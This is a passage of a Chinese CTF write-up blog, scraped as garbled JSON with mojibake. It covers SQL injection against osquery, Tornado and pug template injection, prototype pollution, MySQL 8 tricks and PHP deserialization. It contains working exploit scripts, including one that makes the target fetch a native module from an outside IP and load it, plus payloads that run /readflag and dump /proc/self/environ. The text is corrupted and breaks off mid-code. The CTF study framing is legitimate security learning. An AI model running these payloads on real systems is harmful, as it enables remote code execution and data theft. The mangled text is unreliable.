è¿™è¾¹ä¸»è¦æ˜¯æœ‰ä¸€ä¸ªcurlçš„trickï¼Œç›´æ¥ç²˜è´´å¤åˆ¶æ–‡æ¡£å§ï¼Œæ²¡æœ‰ç¯å¢ƒ bypass url checkï¼š'fi[k-m]e:///hint.txt'bypass output checkï¼š'fi[k-m]e:///{hint.txt,7f7d9107-a48b-284e-a29e-66c871bf5706}' QQQueryyy_all_the_thingsç»§ç»­æ¥ç»­å‘äº†ï¼Œæ„Ÿè§‰è¿˜æ˜¯æƒ³æŠŠè¿™é‡Œçš„é¢˜ç»™å¤ç°ä¸€ä¸‹ï¼Œè¶ç€å‘¨å››ä¸‹åˆæ²¡è¯¾ï¼Œæ¥åšä¸€ä¸‹æµ‹è¯•äº†ä¸€ä¸‹ï¼Œå‘ç°æ˜¯sqliteæ•°æ®åº“çš„æ³¨å…¥ï¼šç»§ç»­å¾€ä¸‹ï¼ŒæŸ¥æŸ¥çœ‹æœ‰æ²¡æœ‰èƒ½ç”¨çš„æ•°æ® sqliteæŸ¥è¯¢è¯­å¥select sqlite_version();select sql from sqlite_master;select sql from sqlite_master where type='';select sql from sqlite_master where type='' and name =''; å¦‚æœæŸ¥å‡ºæ¥çš„viewï¼Œå¯ä»¥ç›´æ¥æŸ¥è¯¢ CREATE VIEW view_p_sum (Product, P_SUM) ASSELECT Product, Price*Quantity FROM p_orders GROUP BY Product;##å¯ä»¥ä½¿ç”¨select * from view_p_sum è¿™é‡Œå°è¯•å†™shellè¯•è¯•ã€‚ã€‚ã€‚ä½†æ˜¯å¾ˆå°´å°¬çš„æ˜¯è¿˜ä¸çŸ¥é“ç»å¯¹è·¯å¾„ å¯ä»¥å‘ç°æœ‰å¾ˆå¤šè¡¨ï¼Œå°è¯•è®¿é—®ä¸€ä¸‹çœ‹çœ‹ ç»§ç»­æ¢ç´¢ï¼Œå‘ç°ä»–ä»¬æ˜¯æ¥è‡ªäºä¸€ä¸ªå«åšosqueryçš„ä¸œè¥¿ï¼Œä»–æ˜¯ æ˜¯ SQL é©±åŠ¨çš„åˆ†æå’Œç›‘æ§æ“ä½œç³»ç»Ÿçš„å·¥å…·ï¼Œæ˜¯æ“ä½œç³»ç»Ÿåˆ†ææ¡†æ¶ã€‚å‚è€ƒï¼šhttps://www.lxlinux.net/4183.htmlå‘ç°ä»–æ˜¯å¯ä»¥å‘½ä»¤æ‰§è¡Œçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬ç»§ç»­æŸ¥ä¸€ä¸‹çœ‹çœ‹ ä»–è¿˜æœ‰å…¶ä»–çš„è¡¨å¯ä»¥ç”¨æ¥æŸ¥è¯¢å‘½ä»¤ï¼Œè€Œåœ¨è¿™é‡Œæœ‰ä¸€ä»½å¾ˆè¯¦ç»†çš„å†…å®¹å„ä¸ªè¡¨ä»¥åŠå¯ä»¥æŸ¥è¯¢çš„å†…å®¹ï¼šhttps://osquery.io/schema/4.1.2#processeså‘ç°flagäº†ä½†æ˜¯è¿™ä¸ªè¯»å–ä¸äº†å†…å®¹å°±å¾ˆéš¾å—äº† å†çœ‹çœ‹æœ‰æ²¡æœ‰å…¶ä»–è¯»æ–‡ä»¶çš„æ“ä½œï¼Ÿ æœ‰å‘ç°ä¸€ä¸ªcurlæŒ‡ä»¤ï¼Œéš¾é“è¯´è¦ssrfå—ï¼Ÿå…ˆçœ‹çœ‹å¼€æ”¾äº†ä»€ä¹ˆç«¯å£å§ ä½¿ç”¨ ?str=';select * from listening_ports;' å¯ä»¥å‘ç°æœ‰ä»¥ä¸‹ç«¯å£ {&quot;address&quot;:&quot;0.0.0.0&quot;,&quot;family&quot;:&quot;2&quot;,&quot;fd&quot;:&quot;-1&quot;,&quot;net_namespace&quot;:&quot;4026532416&quot;,&quot;path&quot;:&quot;&quot;,&quot;pid&quot;:&quot;-1&quot;,&quot;port&quot;:&quot;16324&quot;,&quot;protocol&quot;:&quot;6&quot;,&quot;socket&quot;:&quot;33536608&quot;}, {&quot;address&quot;:&quot;::&quot;,&quot;family&quot;:&quot;10&quot;,&quot;fd&quot;:&quot;-1&quot;,&quot;net_namespace&quot;:&quot;4026532416&quot;,&quot;path&quot;:&quot;&quot;,&quot;pid&quot;:&quot;-1&quot;,&quot;port&quot;:&quot;80&quot;,&quot;protocol&quot;:&quot;6&quot;,&quot;socket&quot;:&quot;33536329&quot;} ] çœ‹åˆ°16324ç«¯å£äº†ï¼Œåœ¨çœ‹çœ‹å…¶ä»–æœåŠ¡ [ {&quot;''&quot;:&quot;&quot;}, {&quot;cmdline&quot;:&quot;/bin/sh /root/start.sh&quot;}, {&quot;cmdline&quot;:&quot;/usr/sbin/apache2 -k start&quot;}, {&quot;cmdline&quot;:&quot;/usr/sbin/apache2 -k start&quot;}, {&quot;cmdline&quot;:&quot;/usr/sbin/apache2 -k start&quot;}, {&quot;cmdline&quot;:&quot;/usr/sbin/apache2 -k start&quot;}, {&quot;cmdline&quot;:&quot;/usr/sbin/apache2 -k start&quot;}, {&quot;cmdline&quot;:&quot;/usr/sbin/apache2 -k start&quot;}, {&quot;cmdline&quot;:&quot;sh -c echo 'SELECT '\\\\'''\\\\'';select cmdline from processes;'\\\\'''\\\\'' as hello;' | osqueryi --json&quot;}, {&quot;cmdline&quot;:&quot;osqueryi --json&quot;}, {&quot;cmdline&quot;:&quot;sleep infinity&quot;}, {&quot;cmdline&quot;:&quot;/usr/sbin/xinetd -pidfile /run/xinetd.pid -stayalive -inetd_compat -inetd_ipv6&quot;}, {&quot;cmdline&quot;:&quot;/usr/sbin/apache2 -k start&quot;} ] å…¶ä¸­æœ€å¯ç–‘çš„åº”è¯¥å°±æ˜¯â€/usr/sbin/xinetdï¼Œæ‰€ä»¥æˆ‘ä»¬é¡ºç€å¾€ä¸‹æŸ¥æŸ¥çœ‹ï¼Œæ­£å¥½æˆ‘ä»¬å¯ä»¥è¯»æ–‡ä»¶ æŸ¥é˜…äº†ä¸€ä¸‹ï¼ŒåŸæ¥xinetdæ˜¯ä¸€ä¸ªæœåŠ¡ xinetdå³extended internet daemonï¼Œxinetdæ˜¯æ–°ä¸€ä»£çš„ç½‘ç»œå®ˆæŠ¤è¿›ç¨‹æœåŠ¡ç¨‹åºï¼Œåˆå«è¶…çº§InternetæœåŠ¡å™¨ã€‚ç»å¸¸ç”¨æ¥ç®¡ç†å¤šç§è½»é‡çº§InternetæœåŠ¡ã€‚xinetdæä¾›ç±»ä¼¼äºinetd+tcp_wrapperçš„åŠŸèƒ½ï¼Œä½†æ˜¯æ›´åŠ å¼ºå¤§å’Œå®‰å…¨ã€‚ ä»–çš„é…ç½®æ–‡ä»¶æ˜¯å­˜åœ¨/etc/xinetd.d/ åœ¨è¿™é‡Œå‘ç°äº†ctfçš„è¿›ç¨‹ {&quot;atime&quot;:&quot;1639034423&quot;,&quot;block_size&quot;:&quot;4096&quot;,&quot;btime&quot;:&quot;0&quot;,&quot;ctime&quot;:&quot;1639035944&quot;,&quot;device&quot;:&quot;0&quot;,&quot;directory&quot;:&quot;/etc/xinetd.d/&quot;,&quot;filename&quot;:&quot;ctf&quot;,&quot;gid&quot;:&quot;0&quot;,&quot;hard_links&quot;:&quot;1&quot;,&quot;inode&quot;:&quot;2101156&quot;,&quot;mode&quot;:&quot;0644&quot;,&quot;mtime&quot;:&quot;1639034423&quot;,&quot;path&quot;:&quot;/etc/xinetd.d/ctf&quot;,&quot;size&quot;:&quot;628&quot;,&quot;symlink&quot;:&quot;0&quot;,&quot;type&quot;:&quot;regular&quot;,&quot;uid&quot;:&quot;0&quot;}] ç”±äºé…ç½®æ–‡ä»¶ä½äºetcï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨linuxä¸­çš„é…ç½®ç¼–è¾‘å™¨augeasè¿›è¡Œè¯»å– AugeasåŸºæœ¬ä¸Šå°±æ˜¯ä¸€ä¸ªé…ç½®ç¼–è¾‘å·¥å…·ã€‚å®ƒä»¥ä»–ä»¬åŸç”Ÿçš„æ ¼å¼è§£æé…ç½®æ–‡ä»¶å¹¶ä¸”å°†å®ƒä»¬è½¬æ¢æˆæ ‘ã€‚é…ç½®çš„æ›´æ”¹å¯ä»¥é€šè¿‡æ“ä½œæ ‘æ¥å®Œæˆï¼Œå¹¶å¯ä»¥ä»¥åŸç”Ÿé…ç½®æ–‡ä»¶æ ¼å¼ä¿å­˜é…ç½®ã€‚ ä½†æ˜¯augeaså°±æ— æ³•è¯»å–å…¶ä»–æ–‡ä»¶äº†â€“ï¼Œå‡ºé¢˜äººè®¾ç½®çš„ä¹Ÿæ˜¯åˆšåˆšå¥½å‘€ ?str=';select * from augeas where path = &quot;/etc/xinetd.d/ctf&quot;;' å‘ç°è¿™ä¸¤ä¸ªä¸œè¥¿ï¼Œè™½ç„¶è¿˜ä¸çŸ¥é“æœ‰å•¥ç”¨ï¼Œä½†æ˜¯å…ˆå­˜ç€å¥½äº† /etc/xinetd.d/ctf&quot;,&quot;value&quot;:&quot;/src/iotjs/build/x86_64-linux/debug/bin/iotjs&quot;value&quot;:&quot;/src/iotjs/tools/repl.js&quot;}, è¿™è¾¹æ˜¯æœ‰å…³äºå…¶çš„ä¸€ä¸ªç®€ä»‹ iotjs æ˜¯ä¸‰æ˜Ÿå¼€æºçš„javascript ç‰©è”ç½‘å¼€å‘å¹³å°ã€‚ å®ƒä¸ºjavascript åº”ç”¨ç¨‹åºæä¾›äº†è®¿é—®ç¡¬ä»¶ã€ç½‘ç»œã€æ–‡ä»¶ç³»ç»Ÿå’Œå¼‚æ­¥åŒ–çš„èƒ½åŠ›ï¼ŒåŠŸèƒ½ç±»ä¼¼äºnodejsï¼Œä½†æ— è®ºæ˜¯ä»£ç ä½“ç§¯è¿˜æ˜¯å†…å­˜éœ€æ±‚ï¼Œiotjs éƒ½è¦å°å¾ˆå¤šï¼Œæ˜¯ç”¨javascript å¼€å‘iot è®¾å¤‡åº”ç”¨ç¨‹åºçš„é¦–é€‰ã€‚ ä»–è¿™è¾¹è¯´äº†iotjsï¼Œå¤§æ¦‚å°±æ˜¯è¦åˆ©ç”¨å®ƒè¿›è¡Œä¸€ä¸ªrceäº†ï¼Œbutâ€“æ¥ä¸‹æ¥å°±æ˜¯ä¸€ä¸ªå¤§å¤§å¤§çš„åªæ˜¯ç›²åŒºäº†ï¼Œå¤§è‡´å°±æ˜¯iotjså¯ä»¥æ¶æ„åŠ è½½æ¨¡å—ï¼Œæˆ‘ä»¬ä¼ å…¥ä¸€ä¸ªæ¶æ„æ¨¡å—ï¼Œè®©ä»–å»åŠ è½½ å¦‚ä½•ç¼–å†™ä¸€ä¸ªæ–°æ¨¡å—ï¼Ÿè¿™é‡Œçœ‹åˆ°çš„æ˜¯ä½¿ç”¨ä¸€ä¸ªå·¥å…·ååŠ©è¿›è¡Œç¼–å†™ï¼Œï¼Œï¼Œå¥½éº»çƒ¦æˆ‘åäº† https://github.com/jerryscript-project/iotjs/blob/master/docs/devs/Writing-New-Module.mdhttps://github.com/jerryscript-project/iotjs/blob/master/docs/api/IoT.js-API-N-API.md xå…ˆç•™ä¸€ä¸ªå‘å§ã€‚ã€‚è´´ä¸€ä¸‹è„šæœ¬ import requestsimport randomimport base64# SQL Injectionurl = &quot;http://47.57.246.66:12321/?str=world';{};--&quot;# Payload from other teampayload = &quot;select group_concat(result)from curl where url='http://127.0.0.1:16324' and user_agent='\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n{node}\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n'&quot;&quot;&quot;&quot;Write native module to serverfs = require(&quot;fs&quot;);http = require(&quot;http&quot;)f = fs.openSync(&quot;/tmp/styp.node&quot;, &quot;w&quot;)http.get({ host: &quot;158.101.144.10&quot;, port: 80, path: &quot;/styp.node?exp&quot;}, function(resp){ resp.on(&quot;data&quot;, function(exploit){ fs.writeSync(f, exploit, 0, exploit.length) }); resp.on(&quot;end&quot;, function(){ fs.closeSync(f) process.exit(1) });});&quot;&quot;&quot;gadget_init = &quot;fs=require(\\&quot;fs\\&quot;);f=fs.openSync(\\&quot;/tmp/styp.node\\&quot;,\\&quot;w\\&quot;);http=require(\\&quot;http\\&quot;);http.get({ host:\\&quot;158.101.144.10\\&quot;,port:80,path:\\&quot;/styp.node?q\\&quot;},function(r){r.on(\\&quot;data\\&quot;,function(c){fs.writeSync(f, nc, 0, c.length);});r.on(\\&quot;end\\&quot;, function(){fs.closeSync(f);process.exit(1);})});&quot;payload_init = payload.format(node=gadget_init)r = requests.get(url.format(payload_init))print(r.text)&quot;&quot;&quot;Run my native modulesty = require(&quot;/tmp/styp.node&quot;)console.log(sty)&quot;&quot;&quot;gadget_shell = &quot;sty=require(\\&quot;/tmp/styp.node\\&quot;);console.log(sty);&quot;payload_shell = payload.format(node=gadget_shell)r = requests.get(url.format(payload_shell))print(r.text) tornadoåœ¨è¿™ä¸ªæ¡†æ¶ä¸‹çš„æ¨¡æ¿æ³¨å…¥ï¼Œä½†æ˜¯æˆ‘æœ¬åœ°æ­å»ºä¸èµ·æ¥ï¼Œæ‰€ä»¥ç›´æ¥ç ”ç©¶ä¸€ä¸‹payloadå§ä»–ä½¿ç”¨çš„æ˜¯tornadoçš„æ¨¡æ¿å¼•æ“ tornadoçš„æ¨¡æ¿å¼•æ“ä¸æ”¯æŒåƒâ€™attrâ€™è¿™æ ·çš„å†…ç½®æ–¹æ³•ï¼Œå®ƒå¯ä»¥è®©æˆ‘ä»¬é€šè¿‡æ‹¼æ¥å­—ç¬¦ä¸²ç»•è¿‡è¿‡æ»¤å™¨ã€‚ä½†å®ƒå…¬å¼€äº†ä¸€ä¸ªåä¸ºhandler. è¿™ä¸ªå¯¹è±¡åŒ…å«å¾ˆå¤šå±æ€§å’Œæ–¹æ³•ã€‚å¦‚æœæˆ‘ä»¬åœ¨è¿™ä¸ªå¯¹è±¡ä¸Šè¿è¡Œä¸€ä¸ª DFS ç®—æ³•ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥æ‰¾åˆ°ä¸€ä¸ªå¼•ç”¨ çš„ dict å¯¹è±¡builtinsã€‚è€Œè¿™ä¸ªå¯¹è±¡çš„è·¯å¾„æ˜¯handler.request.server_connection._serving_future._coro.cr_frame.f_builtins. {{handler.request.server_connection._serving_future._coro.cr_frame.f_builtins['ev'+'al']}}&gt;&gt;&gt; &lt;built-in function eval&gt; æ— æƒ…çš„payloadæ¬è¿å·¥ã€‚ã€‚ {% autoescape request.server_connection._serving_future._coro.cr_frame.f_builtins['exe'+'c'] %}{{ request.headers[&quot;z&quot;] }} import requestspayload=&quot;&quot;&quot;{{% raw &quot;{}&quot; _tt_utf8 = handler.request.server_connection._serving_future._coro.cr_frame.f_builtins['ev'+'al']%}}{{% raw 1 _tt_utf8 = lambda x:x%}}&quot;&quot;&quot;.format(''.join(['\\\\x{:02x}'.format(ord(c)) for c in &quot;__import__('os').popen('/readflag').read()&quot;]))res = requests.post(&quot;http://127.0.0.1:5000/&quot;,data={'data':payload})print(res.text)","link":"/2021/12/08/2021nu1lctf/"},{"title":"2021æ·±è‚²æ¯","text":"weblog","link":"/2021/11/16/2021%E6%B7%B1%E8%82%B2%E6%9D%AF/"},{"title":"2021é™‡åŸæŠ—ç–«","text":"eaaaasyphpä¸€å¼€å§‹çœ¼ç›åªçœ‹åˆ°hintäº†ï¼Œç–¯ç‹‚è¯•ç»•wakeupï¼Œå‘ç°æ²¡ååº”ï¼Œæ‰çŸ¥é“åŸæ¥æ˜¯php7.2ç‰ˆæœ¬çš„ï¼Œè¦åˆ©ç”¨å…¶ä»–åœ°æ–¹çš„ç±»è¯»bypass $a=new Esle();$b=new Bypass();$b-&gt;str4='phpinfo';$a-&gt;c=$b;echo serialize($a); å‘ç°apiæœåŠ¡æ˜¯fastcgiï¼Œ","link":"/2021/11/09/2021%E9%99%87%E5%8E%9F%E6%8A%97%E7%96%AB/"},{"title":"mysql8.0æ–°ç‰¹æ€§æ·±å…¥è¯¦è§£","text":"å‰è¨€æœ€è¿‘æ‰“æ¯”èµ›é‡åˆ°å¾ˆå¤šåœºéƒ½å’Œmysql8.0æœ‰å…³çš„ï¼Œç„¶åçœ‹åˆ°ç½‘ä¸Šå…³äºè¿™ä¸ªçŸ¥è¯†ç‚¹çš„æ–‡ç« ä¹Ÿæ²¡æœ‰å¾ˆå¤šï¼Œäºæ˜¯å†³å®šå¥½å¥½æ€»ç»“ä¸€ä¸‹ã€‚ ç¯å¢ƒé…ç½®æœ¬åœ°ä¸€ç›´ç”¨çš„å°±æ˜¯mysql8.0ï¼Œæ‰€ä»¥å°±æ²¡æ”¹äº†ï¼Œç„¶åé¢˜ç›®çš„è¯ç›´æ¥ä½¿ç”¨sqlilabsé¶åœºå³å¯ tabletableæ˜¯mysqlæ–°æ¨å‡ºçš„ä¸€ä¸ªæŸ¥è¯¢åŠŸèƒ½ï¼Œå¯ä»¥è¯´æ˜¯selectçš„æ›¿ä»£ï¼Œè™½ç„¶åŠŸèƒ½æ¯”selectå·®ç‚¹ TABLE table_name [ORDER BY column_name] [LIMIT number [OFFSET number]] eg:table users;table users order by usernametable users order by username limit 0,1; å¯ä»¥å‘ç°tableæ˜¾ç¤ºçš„æ˜¯æ•´ä¸ªusersè¡¨çš„å†…å®¹å®ƒè¿˜å¯ä»¥æ·»åŠ å‚æ•°ï¼Œä½¿å¾—è¡¨æ•°æ®çš„æ˜¾ç¤ºæ–¹å¼å˜å¾—å¤šå…ƒåŒ–ä¸€äº› å¦‚æœåªéœ€è¦æŸä¸€è¡Œï¼Œè¿˜å¯ä»¥æ·»åŠ limitå‡½æ•°è¿›è¡Œæˆªå– å®æˆ˜ï¼š1.å’Œunionç»„åˆå¯ä»¥ç›´æ¥å’Œunionç»„åˆæ„æˆä¸‡èƒ½å¯†ç ï¼Œåœ¨æœ‰å›æ˜¾çš„é¢˜ç›®å½“ä¸­ï¼Œä¹Ÿå¯ä»¥ç›´æ¥ç”¨æ¥æŸ¥è¡¨çš„æ•°æ®ï¼Œä½†æ˜¯ç”±äºæ— æ³•ä½¿ç”¨group_concat()æ‰€ä»¥åªèƒ½åˆ©ç”¨limitï¼Œä¸€ä¸ªä¸ªæˆªå–å¾—åˆ° -1'union table users limit 0,1--+ 2.æ— åˆ—åç›²æ³¨å½“é¢˜ç›®è¿‡æ»¤äº†selectå’Œå¸¸ç”¨çš„inforè¡¨æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨tableè¿˜æœ‰mysql.innodb_table_statsè¿›è¡Œæ›¿æ¢ table mysql.innodb_table_stats æ­¤æ—¶æˆ‘ä»¬å³å¯æŸ¥è¯¢å¾—åˆ°è¡¨å è€Œåœ¨tableä¸­çš„ç›²æ³¨å’Œæ™®é€šçš„ç›²æ³¨ä¸å¤ªä¸€æ ·ï¼Œå®ƒæ˜¯æŒ‰ä½æˆªå–å¯¹æ¯”çš„","link":"/2021/11/07/2021%E9%A6%99%E5%B1%B1%E6%9D%AF/"},{"title":"bsides-ahmedabad-ctf-2021","text":"pugpug æ ¹æ®å¤§å¸ˆå‚…çš„wpï¼Œè¿™é¢˜æ˜¯åŸå‹é“¾æ±¡æŸ“ï¼Œä½†æ˜¯æˆ‘æ²¡çœ‹å‡ºæ¥ï¼Œæ‰€ä»¥è®¤ä¸ºè¿˜æ˜¯åº”è¯¥å›å»ç†è§£ä¸€ä¸‹ï¼Œä»€ä¹ˆæƒ…æ™¯ä¸‹ä¼šé€ æˆåŸå‹é“¾æ±¡æŸ“ï¼Ÿ åŸå‹é“¾æ±¡æŸ“å½¢æˆåŸå› å¦‚æœå¯ä»¥æ§åˆ¶å¹¶ä¿®æ”¹ä¸€ä¸ªå¯¹è±¡çš„åŸå‹ï¼Œé‚£ä¹ˆå°†å¯ä»¥å½±å“æ‰€æœ‰å’Œå¯¹è±¡æ¥è‡ªåŒä¸€ä¸ªç±»ã€çˆ¶ã€ç»„ç±»çš„å¯¹è±¡ ä»€ä¹ˆæ—¶å€™å¯ä»¥åˆ©ç”¨å­˜åœ¨å¯æ§çš„å¯¹è±¡é”®å€¼ function merge(target, source) { for (let key in source) { if (key in source &amp;&amp; key in target) { merge(target[key], source[key]) } else { target[key] = source[key] } }} åˆ†æå‚æ•°ä¼ å…¥å°†ç»è¿‡deparamè¿›è¡Œå¤„ç† var input = deparam(req.originalUrl.slice(2)); åœ¨deparamä¸­å­˜åœ¨åŸå‹é“¾æ±¡æŸ“ï¼Œä¸»è¦åœ¨ä¸‹é¢è¿™æ®µä»£ç ï¼Œå¦‚æœä½ ä¼ å…¥äº†ä¸€ä¸ªæ•°ç»„ï¼Œå«æœ‰å¤šä¸ªé”®ï¼Œé‚£ä¹ˆå°±ä¼šè¿›å…¥ä»¥ä¸‹å¾ªç¯è¿›è¡Œèµ‹å€¼ï¼Œæˆ‘ä»¬å¯ä»¥è·Ÿä¸€ä¸‹å€¼æ¥åˆ†æä¸€ä¸‹ keys_last = keys.length - 1; for ( ; i &lt;= keys_last; i++ ) { key = keys[i] === '' ? cur.length : keys[i]; console.log(key[i]); cur = cur[key] = i &lt; keys_last ? cur[key] || ( keys[i+1] &amp;&amp; isNaN( keys[i+1] ) ? {} : [] ) : val; } å¯ä»¥çœ‹åˆ°keysçš„æ•°ç»„çš„å€¼åˆ†æˆäº†ä¸‰éƒ¨åˆ†: å†å¾€ä¸‹ç»§ç»­è°ƒè¯•æ­¤æ—¶keyåˆ†ä¸ºä¸‰éƒ¨åˆ†ï¼Œcurä¸ºå«æœ‰æ‰€æœ‰é”®ä»¥åŠå…¶å€¼æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œå½“keyä¸ºconstructorï¼Œä»–å°±ä¼šå‘ä¸Šç»§æ‰¿å»è·å–å…¶constructorçš„å€¼ constructorå±æ€§çš„å«ä¹‰å°±æ˜¯æŒ‡å‘è¯¥å¯¹è±¡çš„æ„é€ å‡½æ•°ï¼Œæ‰€æœ‰å‡½æ•°ï¼ˆæ­¤æ—¶çœ‹æˆå¯¹è±¡äº†ï¼‰æœ€ç»ˆçš„æ„é€ å‡½æ•°éƒ½æŒ‡å‘Functionï¼Œè€Œsaasaæ˜¯ä¸€ä¸ªstringï¼Œé‚£ä¹ˆå°±æ˜¯æŒ‡å‘è·å¾—äº†ä¸€ä¸ªstring()ï¼Œè€Œæ‰€æœ‰å‡½æ•°çš„constructoréƒ½æŒ‡å‘Functionï¼Œä¹Ÿå°±æ˜¯æœ€åŸå§‹çš„é‚£ä¸ª è€Œåœ¨è¿™ä¸ªFunction()ä¸‹é¢åˆæœ‰å¾ˆå¤šçš„å‡½æ•°ï¼Œå¯ä»¥å‘ç°æœ‰ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼ï¼Œä¹Ÿå°±æ˜¯è¿‡æ»¤æˆ‘ä»¬å­—ç¬¦çš„å‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æ±¡æŸ“è¿™ä¸ªæ­£åˆ™è¡¨è¾¾å¼ï¼Œæ¥å®ç°ç»•è¿‡ï¼Œå¯ä»¥çœ‹åˆ°æ­¤æ—¶çš„ä¸‰éƒ¨åˆ†,cur[key]çš„å€¼å·²ç»ä¸ºé‚£ä¸ªæ­£åˆ™è¡¨è¾¾å¼çš„å†…å®¹äº† æœ€åç›´æ¥å°†è¿™ä¸ªæ­£åˆ™è¡¨è¾¾å¼èµ‹å€¼ä¸ºæˆ‘ä»¬ä¼ å…¥çš„æ±¡æŸ“æ•°æ®: æ¢³ç†ä¸€ä¸‹ä»£ç é€»è¾‘ï¼šå¦‚æœæˆ‘ä»¬ä¼ å…¥ä¸€ä¸ªæ•°ç»„æ•°æ®ï¼Œé‚£ä¹ˆä»–ä¼šé€’å½’å–å€¼å¹¶è¿›è¡Œé‡æ–°èµ‹å€¼ï¼Œç›´åˆ°æœ€åä¸€ä¸ªå€¼è¢«èµ‹å‡º ä¼ å…¥:test=aaa&amp;test[constructor][SafetifyRegExp]=ssssè¿‡ç¨‹:cur={name:xxx,test:xxx}cur=cur[test]=&gt;cur=aaacur=cur[constructor]=&gt;aaa[constructor]=string()cur=cur[SafetifyRegExp]=&gt;string()[SafetifyRegExp]=æ­£åˆ™è¡¨è¾¾å¼æ­¤æ—¶æ•°ç»„é€’å½’éå†ç»“æŸï¼Œè¿›è¡Œèµ‹å€¼string()[SafetifyRegExp]=ssss æ¨¡æ¿æ³¨å…¥æ¥ä¸‹æ¥å°±æ˜¯pugçš„æ¨¡æ¿æ³¨å…¥äº†ï¼Œæƒ³è¦ç›´æ¥getshellæ˜¯æ²¡åŠæ³•çš„å› ä¸ºä»–è¿‡æ»¤å¾—å¾ˆä¸¥æ ¼è€Œä¸”æˆ‘ä»¬æ— æ³•ç»•è¿‡: const denylist = [&quot;%&quot;,&quot;(&quot;,&quot;global&quot;, &quot;process&quot;,&quot;mainModule&quot;,&quot;require&quot;,&quot;child_process&quot;,&quot;exec&quot;,&quot;\\&quot;&quot;,&quot;'&quot;,&quot;!&quot;,&quot;`&quot;,&quot;:&quot;,&quot;-&quot;,&quot;_&quot;]; ä½†æ˜¯åœ¨/serverstatusä¸­æœ‰å‘½ä»¤æ‰§è¡Œï¼Œå¹¶ä¸”è¿™é‡Œå¯ä»¥ä¼ å…¥å‚æ•°ï¼Œå³reqï¼Œresï¼Œä½†æ˜¯ç”±äºoptions.optionså†™æ­»äº†ï¼Œå¯¼è‡´è¿™é‡Œçš„å‘½ä»¤æ˜¯æ‰§è¡Œä¸äº†çš„ï¼Œå› ä¸ºç›´æ¥timeout500äº†==ï¼Œæ‰€ä»¥æˆ‘ä»¬å…ˆæ¥è§¦ä»–ï¼Œç„¶åå†æ§åˆ¶options.argså®ç°å‘½ä»¤æ‰§è¡Œ app.get('/serverstatus', (req, res) =&gt; { const result = child_process.spawnSync('ps' , options.args, options.options); out = result.stdout.toString(); res.send(out);}); é¦–å…ˆæˆ‘ä»¬è¦è®©childe_process.spawnSyncå¯ä»¥æ‰§è¡Œshellå‘½ä»¤ï¼Œæ‰€ä»¥éœ€è¦æ‰“å¼€è¿™ä¸ªæ¨¡å¼ï¼Œæ˜¯è¦ç”¨urlç¼–ç å³å¯ç»•è¿‡:çš„è¿‡æ»¤ %23{options.options.shell%3Dtrue} æ¥ä¸‹æ¥å†å¯¹options.argsè¿›è¡Œé‡æ–°èµ‹å€¼ï¼Œåˆ©ç”¨nameè¿›è¡Œä¼ å‚ç»•è¿‡å¼•å·è¿‡æ»¤ï¼ˆæ— æ³•åƒshell:trueï¼‰ç›´æ¥ä¼ å‚çš„åŸå› ï¼š ?name=cpu,args%20;cat%20/proc/self/environ&amp;content=%23{options.args%3D[options.args[0],name]} æœ€ç»ˆå¯ä»¥å‘ç°æ‰§è¡Œå‘½ä»¤ä¸º: ps -eo cpu,args;cat /proc/self/environ ç”±äºæ˜¯windowsä¸‹å¤ç°çš„ï¼Œå°±ä¸æ¼”ç¤ºäº†","link":"/2021/11/11/bsides-ahmedabad-ctf-2021-0/"},{"title":"","text":"å‰è¨€æœ€è¿‘éƒ½åœ¨ç”¨dockeræ¥å¤ç°é¢˜ç›®ï¼Œä½†æ˜¯æ¯æ¬¡éƒ½å¿˜è®°æŒ‡ä»¤ï¼Œæ‰€ä»¥æ¥æ•´ç†ä¸€ä¸‹ docker build -t dockeråå­— -f dockerè·¯å¾„ .ä¾‹: docker build -t eaysphp -f ./Dockerfile . è¿è¡Œdocker docker run -itd -p è¦æ˜ å°„çš„ç«¯å£å·ï¼ˆé’ˆå¯¹æœåŠ¡å™¨è€Œè¨€ï¼‰:dockeré‡Œé¢çš„webæœåŠ¡ç«¯å£ docker run -itd -p 8080:80 easyphp /bin/bash(è¿™ä¸ªæœ‰çš„æ—¶å€™è¦åŠ ) è¿›å…¥docker docker ps å…ˆçœ‹ä¸€ä¸‹è¦è¿›å…¥çš„dockeriddocker exec -it dockerçš„id bashdocker exec -it 5axxxx bash ä¸€äº›æŠ¥é”™ systmctl daemon-reloadservice docker restartservice docker status docker stop dockerçš„id é‡åˆ°docker-compose.yamlç›´æ¥åœ¨é‚£ä¸ªæ–‡ä»¶æ‰€åœ¨ç›®å½• docker-compose up","link":"/2021/11/25/docker%E5%9F%BA%E6%93%8D/"},{"title":"pharååºåˆ—åŒ–","text":"å‰è¨€ä¹‹å‰å†™è¿‡çš„å…³äºpharçš„è€ƒç‚¹ï¼Œä½†æ˜¯å¿˜è®°æ”¾åœ¨å“ªä¸ªåšå®¢äº†ï¼Œä»¥åå‘½åè¿˜æ˜¯ä¸èƒ½ä»¥æ¯”èµ›é¢˜ç›®å‘½åå‘€ã€‚ã€‚ã€‚æ‰€ä»¥é‡æ–°æ•´ç†ä¸€ä¸‹ pharè§¦å‘å‡½æ•° exif exif_thumbnail exif_imagetype gd imageloadfont imagecreatefrom*** hash hash_hmac_file hash_file hash_update_file md5_file sha1_file file / url get_meta_tags get_headers standard getimagesize getimagesizefromstringfinfo_file/finfo_buffer/mime_content_type","link":"/2021/11/23/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"title":"2021iæ˜¥ç§‹ç§‹å­£ä¸ªäººèµ›","text":"å‰è¨€å’Œå®‰æ´µæ¯å†²äº†ï¼Œåœ¨å®‰æ´µæ¯æ²¡æ€è·¯çš„æ—¶å€™å»åšäº†ä¸€ä¸‹ï¼Œå°±åšäº†ä¸€ä¸‹ç¬¬ä¸€é¢˜ unameæºç å¾ˆç®€å•ï¼Œåˆ†ä¸ºexistså’Œuploadä¸¤éƒ¨åˆ† &lt;?phpclass name1{ public $var; public function __destruct(){ echo $this-&gt;var; }}class name2{ public function __toString(){ $_POST[&quot;func&quot;](); return &quot;&quot;; 